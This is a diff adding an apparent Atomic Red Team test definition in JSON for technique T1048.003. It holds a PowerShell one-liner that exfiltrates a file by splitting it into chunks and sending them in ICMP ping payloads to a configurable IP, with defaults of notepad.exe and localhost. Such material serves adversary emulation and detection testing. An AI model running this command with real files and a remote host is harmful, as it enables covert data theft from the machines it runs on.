@@ -1,0 +1,37 @@
+{
+  "id": "dd4b4421-2e25-4593-90ae-7021947ad12e",
+  "name": "Exfiltration Over Alternative Protocol - ICMP",
+  "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "20f9a0dc-95e6-45bf-b7c7-f2a198081a63",
+      "type": "execute-command",
+      "data": {
+        "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1048.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "input_file",
+      "type": "path",
+      "description": "Path to file to be exfiltrated.",
+      "value": "C:\\Windows\\System32\\notepad.exe"
+    },
+    {
+      "name": "ip_address",
+      "type": "string",
+      "description": "Destination IP address where the data should be sent.",
+      "value": "127.0.0.1"
+    }
+  ]
+}
